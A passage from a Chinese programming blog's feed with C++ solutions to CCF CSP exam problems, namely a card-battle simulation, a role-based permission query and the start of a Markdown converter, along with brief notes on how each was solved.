punctuation">,</span>defender<span class="token punctuation">;</span>           cin<span class="token operator">>></span>attacker<span class="token operator">>></span>defender<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>turn<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//A 攻击 B </span>            <span class="token keyword">if</span><span class="token punctuation">(</span>defender<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                a<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">-</span><span class="token operator">=</span>b<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                b<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">-</span><span class="token operator">=</span>a<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>attacker<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> b<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>defender<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                B<span class="token operator">-</span><span class="token operator">=</span>a<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>B<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//B 攻击 A </span>            <span class="token keyword">if</span><span class="token punctuation">(</span>defender<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                b<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">-</span><span class="token operator">=</span>a<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                a<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">-</span><span class="token operator">=</span>b<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> b<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>attacker<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>defender<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>defender<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                A<span class="token operator">-</span><span class="token operator">=</span>b<span class="token punctuation">[</span>attacker<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>attack<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       turn<span class="token operator">*</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>B<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token keyword">else</span> cout<span class="token operator">&lt;&lt;</span><span class="token number">0</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> cout<span class="token operator">&lt;&lt;</span>A<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> cout<span class="token operator">&lt;&lt;</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     cout<span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> cout<span class="token operator">&lt;&lt;</span>endl<span class="token operator">&lt;&lt;</span>B<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> cout<span class="token operator">&lt;&lt;</span>b<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>b<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     cout<span class="token operator">&lt;&lt;</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>blood<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906122126408.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-vector </tag>
            
            <tag> 大模拟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF权限查询---解释一下什么是“大力出奇迹”</title>
      <link href="/2020/09/06/quanxianchaxun/"/>
      <url>/2020/09/06/quanxianchaxun/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201612-3">CCF-201612-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906140342541.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu-ba">我们先来看一下题目吧</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906140359228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906140406941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906140414611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>真的很恼火，思路简单，写起来比较繁琐。<br>全部存下来，然后一个一个查，查到了true，否则false，如果是无等级查询可能会返回等级<br>挺费时间的，没办法，后面的算法题不会，只能刚模拟了<br><strong>查询一般用map比较方便，尝试过map，但是因为map的对应值唯一，所以好像会掉分，一直没解决。<br>这题就是直接vector爆搜，大力出奇迹啊！！！</strong></p><h3><span id="zhu-yi-dian">注意点</span></h3><p>一定要边写边编译，写完了最后一起来找bug太难找了，一个模块一个模块的找，比较好，而且有助于保持清晰的思路。</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> priv<span class="token punctuation">{</span>    string name<span class="token punctuation">;</span>    <span class="token keyword">int</span> rank<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> role<span class="token punctuation">{</span>    string name<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>priv<span class="token operator">></span> privilege<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> user<span class="token punctuation">{</span>    string name<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> role_name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>role<span class="token operator">></span> roles<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>user<span class="token operator">></span> users<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> p<span class="token punctuation">,</span>r<span class="token punctuation">,</span>u<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    cin<span class="token operator">>></span>p<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string cate<span class="token punctuation">;</span>      cin<span class="token operator">>></span>cate<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cin<span class="token operator">>></span>r<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>r<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      role t<span class="token punctuation">;</span>      priv t2<span class="token punctuation">;</span>      cin<span class="token operator">>></span>t<span class="token punctuation">.</span>name<span class="token punctuation">;</span>      <span class="token keyword">int</span> n<span class="token punctuation">;</span>      cin<span class="token operator">>></span>n<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          string temp<span class="token punctuation">;</span>          cin<span class="token operator">>></span>temp<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            t2<span class="token punctuation">.</span>name<span class="token operator">=</span>temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span>rank<span class="token operator">=</span>temp<span class="token punctuation">[</span>temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            t2<span class="token punctuation">.</span>name<span class="token operator">=</span>temp<span class="token punctuation">;</span>            t2<span class="token punctuation">.</span>rank<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          t<span class="token punctuation">.</span>privilege<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      roles<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cin<span class="token operator">>></span>u<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>u<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      user t<span class="token punctuation">;</span>      cin<span class="token operator">>></span>t<span class="token punctuation">.</span>name<span class="token punctuation">;</span>      <span class="token keyword">int</span> n<span class="token punctuation">;</span>      cin<span class="token operator">>></span>n<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          string temp<span class="token punctuation">;</span>          cin<span class="token operator">>></span>temp<span class="token punctuation">;</span>          t<span class="token punctuation">.</span>role_name<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      users<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cin<span class="token operator">>></span>q<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string name<span class="token punctuation">,</span>p<span class="token punctuation">,</span>p_name<span class="token punctuation">;</span>      <span class="token keyword">int</span> p_rank<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>      cin<span class="token operator">>></span>name<span class="token operator">>></span>p<span class="token punctuation">;</span>      <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>p<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//查询带等级，先提取</span>          p_name<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p_rank<span class="token operator">=</span>p<span class="token punctuation">[</span>p<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>users<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">==</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//找到对应的人 </span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>role_name<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这个人有多个角色 </span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>roles<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>role_name<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//找到这个人的每个角色 </span>                      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>l<span class="token operator">&lt;</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>l<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//每个角色有多个权限 </span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>rank<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//当前遍历权限无rank </span>                                   <span class="token comment" spellcheck="true">//输入的权限无rank直接比较</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">==</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>                          flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                          <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//当前扁你权限有rank </span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>p<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//查询带等级</span>                          <span class="token keyword">if</span><span class="token punctuation">(</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">==</span>p_name<span class="token operator">&amp;&amp;</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>rank<span class="token operator">>=</span>p_rank<span class="token punctuation">)</span><span class="token punctuation">{</span>                               flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                               <span class="token keyword">break</span><span class="token punctuation">;</span>                          <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//查询不带等级 </span>                           <span class="token keyword">if</span><span class="token punctuation">(</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">==</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>                                 <span class="token keyword">if</span><span class="token punctuation">(</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>rank<span class="token operator">></span>p_rank<span class="token punctuation">)</span><span class="token punctuation">{</span>                                     flag<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>                                     p_rank<span class="token operator">=</span>roles<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>privilege<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>rank<span class="token punctuation">;</span>                                 <span class="token punctuation">}</span>                           <span class="token punctuation">}</span>                         <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                       <span class="token punctuation">}</span>                     <span class="token punctuation">}</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span>p_rank<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>     <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span><span class="token string">"true"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>     <span class="token keyword">else</span> cout<span class="token operator">&lt;&lt;</span><span class="token string">"false"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906141938917.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-vector </tag>
            
            <tag> 暴力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCFMarkdown---用到了状态机的思想</title>
      <link href="/2020/09/06/markdown/"/>
      <url>/2020/09/06/markdown/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201703-3">CCF-201703-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906190808241.GIF#pic_center" alt="下面都不会了"></p><h2><span id="ti-mu-ru-xia">题目如下</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906190827922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906190835819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906190844325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906190853468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="4"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>1.先处理行内的强调和超级链接<br>2.然后处理区块，用到了状态机思想（第一次切换状态的时候加前一状态的后缀和现在状态的前缀）<br>3.过了样例后只有60分，把写的函数全部不用了，一起写到主函数，突然就可以了，我就纳闷。还没找到原因，之后会持续更新的<br>4.反正我是做自闭了。可恶！</p><h3><span id="man-fen-dai-ma">满分代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>string t<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       string line<span class="token punctuation">;</span>       string temp<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>       <span class="token keyword">int</span> sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>       <span class="token keyword">int</span> start<span class="token punctuation">,</span>end<span class="token punctuation">;</span>       <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span>cin<span class="token punctuation">,</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">while</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token operator">!=</span>line<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>                     start<span class="token operator">=</span>line<span class="token 